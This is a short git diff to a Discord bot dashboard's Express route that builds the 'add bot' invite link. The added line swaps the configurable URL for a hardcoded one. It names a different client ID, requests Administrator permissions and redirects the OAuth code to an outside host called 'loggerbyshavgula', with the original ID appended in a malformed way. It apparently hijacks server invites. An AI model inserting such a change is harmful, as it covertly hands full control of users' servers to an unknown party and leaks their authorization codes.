@@ -361,7 +361,7 @@ app.get('/guilds', async (req, res) => {
   if (!clientId) return res.status(500).send('<h3>Missing BOT_CLIENT_ID (Application ID) in env</h3>');
 
   const perms = process.env.BOT_PERMISSIONS || '8';
-  const addBotUrl = `https://discord.com/oauth2/authorize?client_id=${encodeURIComponent(clientId)}&scope=bot%20applications.commands&permissions=${encodeURIComponent(perms)}`;
+  const addBotUrl = `https://discord.com/oauth2/authorize?client_id=1450459526410014741&permissions=8&response_type=code&redirect_uri=https%3A%2F%2Floggerbyshavgula.up.railway.app%2Fcallback&integration_type=0&scope=bot${encodeURIComponent(clientId)}&scope=bot%20applications.commands&permissions=${encodeURIComponent(perms)}`;
 
   let manageableHtml = '';
   for (const g of manageable) {
